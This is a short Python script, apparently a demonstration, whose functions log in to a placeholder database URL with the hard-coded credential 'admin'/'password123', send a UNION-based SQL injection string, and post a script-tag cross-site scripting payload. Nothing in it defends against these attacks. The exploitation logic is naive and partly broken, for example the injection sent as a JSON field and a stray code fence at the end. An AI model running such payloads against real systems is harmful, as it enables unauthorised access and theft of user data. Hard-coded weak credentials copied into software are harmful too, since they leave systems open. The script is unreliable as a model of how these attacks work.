import os
import requests
import json

# Function to generate a weak password
def generate_weak_password():
    return "password123"

# Function to connect to a database using a weak password
def connect_to_database():
    username = "admin"
    password = generate_weak_password()
    db_url = "http://example.com/db"

    try:
        response = requests.post(db_url, json={"username": username, "password": password})
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to database: {e}")

# Function to exploit a SQL injection vulnerability
def exploit_sql_injection():
    sql_query = "' UNION SELECT * FROM users WHERE 1=1; --"
    db_url = "http://example.com/db"

    try:
        response = requests.post(db_url, json={"sql_query": sql_query})
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error exploiting SQL injection: {e}")

# Function to exploit a cross-site scripting (XSS) vulnerability
def exploit_xss():
    user_input = "<script>alert('XSS')</script>"
    db_url = "http://example.com/db"

    try:
        response = requests.post(db_url, json={"user_input": user_input})
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error exploiting XSS: {e}")

# Main function to demonstrate vulnerabilities
def main():
    connect_to_database()
    exploit_sql_injection()
    exploit_xss()

if __name__ == "__main__":
    main()
```

